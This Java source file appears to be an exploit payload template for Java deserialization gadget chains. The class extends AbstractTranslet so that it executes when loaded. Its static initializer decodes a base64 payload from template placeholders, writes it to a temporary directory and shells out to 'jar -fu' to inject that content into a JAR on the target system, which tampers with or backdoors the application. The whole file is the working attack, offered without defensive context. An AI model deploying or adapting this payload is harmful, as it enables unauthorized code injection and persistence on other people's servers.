import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;

public class UpdateJar extends AbstractTranslet {
    static {
        try {
            String jarPath = "%jarPath%";
            String entryPath = "%entryPath%";
            String b64 = "%b64%";
            byte[] content = sun.misc.BASE64Decoder.class.newInstance().decodeBuffer(b64);
            updateJar(jarPath,entryPath,content);
            int flag = 1;
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public static void updateJar(String jarPath , String entryPath , byte[] content) throws Exception{
        File tmp = Files.createTempDirectory("1nhann").toFile();
        String tmpPath = tmp.getPath();
        String path = tmpPath + "/" + entryPath;
        try {
            File j = new File(jarPath);
            String dir = path.substring(0,path.lastIndexOf('/'));
            File d = new File(dir);
            d.mkdirs();

            Files.write(Paths.get(path), content);

            String[] cmd = new String[]{"jar","-fu",j.getAbsolutePath(),entryPath};
            ProcessBuilder processBuilder = new ProcessBuilder(cmd)
                .directory(tmp);
            Process p = processBuilder.start();

            while (p.isAlive()){

            }
            p.destroy();
        }catch (Exception e){
            throw new RuntimeException(e);
        }finally {
            new File(path).delete();
            tmp.delete();
        }
    }
    public UpdateJar() throws Exception{
        namesArray = new String[]{"fuck"};
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
